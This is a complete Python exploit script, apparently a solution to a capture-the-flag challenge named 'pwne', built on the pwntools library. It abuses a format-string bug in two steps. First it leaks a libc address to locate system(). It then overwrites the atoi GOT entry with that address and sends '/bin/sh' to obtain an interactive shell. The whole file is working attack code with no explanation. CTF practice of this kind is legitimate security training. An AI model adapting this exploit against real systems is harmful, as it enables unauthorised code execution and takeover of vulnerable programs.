from pwn import *

def debug(addr = '0x0804867E'):
    raw_input('debug:')
    gdb.attach(r, "b *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

#localsystem = 0x0003ADA0

context(arch='i386', os='linux', log_level='debug')

r = process('/home/h11p/hackme/huxiangbei/pwne')

#r = remote('hackme.inndy.tw', 7711)

elf = ELF('/home/h11p/hackme/huxiangbei/pwne')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

def exec_fmt(payload):
    r.recvuntil('WANT PLAY[Y/N]\n')
    r.sendline('Y')
    r.recvuntil('GET YOUR NAME:\n')
    r.recvuntil('\n')
    r.sendline(payload)
    info = r.recv().splitlines()[1]
    print "info:"+info
    r.sendline('10')
    #r.close()
    return info
autofmt = FmtStr(exec_fmt)
r.close()

r = process('/home/h11p/hackme/huxiangbei/pwne')
atoi_got_addr = elf.got['atoi']
print "%x" % atoi_got_addr
system_offset_addr = libc.symbols['system']
print "%x" % system_offset_addr

payload1="%35$p"

#debug()

r.recvuntil('WANT PLAY[Y/N]\n')
r.sendline('Y')
r.recvuntil('GET YOUR NAME:\n')
r.recvuntil('\n')
r.sendline(payload1)
libc_start_main = r.recv().splitlines()[1]
libc_module=base_addr(libc_start_main,0x18637)
system_addr=libc_module+system_offset_addr
print "system_addr:"+hex(system_addr)
r.sendline('10')

payload2 = fmtstr_payload(autofmt.offset, {atoi_got_addr: system_addr})
r.recvuntil('WANT PLAY[Y/N]\n')
r.sendline('Y')
r.recvuntil('GET YOUR NAME:\n')
r.recvuntil('\n')
r.sendline(payload2)
r.recv()
#r.sendline('10')
r.sendline('/bin/sh')
r.interactive()
r.close()
